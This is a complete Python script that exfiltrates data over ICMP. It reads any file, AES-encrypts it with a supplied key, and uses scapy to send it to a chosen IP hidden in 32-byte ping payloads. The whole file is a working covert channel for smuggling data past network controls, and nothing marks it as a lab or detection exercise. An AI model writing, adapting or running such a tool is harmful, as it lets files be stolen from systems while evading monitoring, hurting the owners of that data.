import os.path
import sys

from scapy.error import Scapy_Exception
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import send

from smugon_aes256 import AESCipher


def encrypt_content(content: bytes, key: bytes) -> bytes:
    return AESCipher(key).encrypt(content)


def send_content(ip: str, content: bytes, chunk_size: int = 32) -> bool:
    chunks = [content[i:i + chunk_size] for i in range(0, len(content), chunk_size)]
    chunk = None

    try:
        for chunk in chunks:
            packet = IP(dst=ip) / ICMP() / chunk
            send(packet)

        return True

    except Scapy_Exception as e:
        print(f"Error while sending packet with data: {chunk} to {ip} because of {e}")
        return False


def read_content(file_path: str) -> bytes:
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            data = f.read()
    return data


def main():
    assert len(sys.argv) > 3, f"Usage: python {sys.argv[0]} <IP> <FILE> <KEY>"

    ip = sys.argv[1]
    file_path = sys.argv[2]
    key_path = sys.argv[3]

    data = read_content(file_path)
    assert data is not None, f"Could not load content from file {file_path}"

    with open(key_path, 'rb') as f:
        key = f.read()

    if key is not None:
        encrypted = encrypt_content(data, key)
        send_content(ip, encrypted)


if __name__ == '__main__':
    main()
